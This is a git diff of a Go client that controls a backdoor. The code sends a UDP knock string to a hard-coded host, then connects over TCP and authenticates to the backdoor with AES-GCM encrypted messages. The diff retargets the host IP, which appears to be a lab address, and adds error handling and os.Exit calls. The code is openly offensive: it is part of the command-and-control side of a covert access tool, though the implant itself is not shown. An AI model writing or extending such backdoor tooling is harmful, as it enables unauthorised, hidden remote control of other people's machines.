@@ -82,7 +82,7 @@ func recvThread(conn net.Conn, gcm cipher.AEAD, info []byte, wg *sync.WaitGroup)
 }
 
 const (
-	CONN_HOST    = "10.0.2.4"
+	CONN_HOST    = "10.0.2.5"
 	CONN_PORT    = "3333"
 	CONN_UDPPORT = "6666"
 	CONN_TIMEOUT = 2
@@ -101,7 +101,7 @@ func main() {
 	udp, uerr := net.Dial("udp", CONN_HOST+":"+CONN_UDPPORT)
 	if uerr != nil {
 		fmt.Println("Error dialing the backdoor, exiting...")
-		return
+		os.Exit(1)
 	}
 	udp.Write([]byte("!@fizzbuzz@!"))
 	udp.Close()
@@ -118,7 +118,7 @@ func main() {
 	}
 	if err != nil {
 		fmt.Println("Error dialing the backdoor, exiting...")
-		return
+		os.Exit(1)
 	}
 	defer conn.Close()
 
@@ -158,14 +158,18 @@ func main() {
 	conn.Write(ct)
 
 	// Read the ack from server
-	readLen, _ = conn.Read(buf)
+	readLen, err = conn.Read(buf)
+	if err != nil {
+		fmt.Println("Server likely closed connection due to wrong password")
+		os.Exit(1)
+	}
 	tempBuf := buf[:readLen]
 	ack, err := open(tempBuf, info, gcm)
 	if err != nil {
 		fmt.Println("Failed to decrypt")
 	}
 	if string(ack) != "ack" {
-		return
+		os.Exit(1)
 	}
 
 	// Start threads for handling connection
